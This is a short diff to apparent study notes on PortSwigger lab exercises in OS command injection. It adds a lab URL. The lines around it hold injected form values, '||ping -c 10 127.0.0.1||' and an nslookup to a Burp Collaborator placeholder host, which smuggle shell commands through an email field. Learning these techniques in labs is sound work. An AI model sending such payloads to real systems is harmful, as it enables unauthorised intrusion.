@@ -5,6 +5,7 @@ name=test&email=||ping -c 10 127.0.0.1||test%40gmail.com&subject=test&message=te
 ```
 3. || is the logical OR operator. The ```ping -c 10 127.0.0.1``` command will execute if its previous command fail, which is the case since the value of email is invalid.
 
+Url:https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
 ```
 email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
 ```
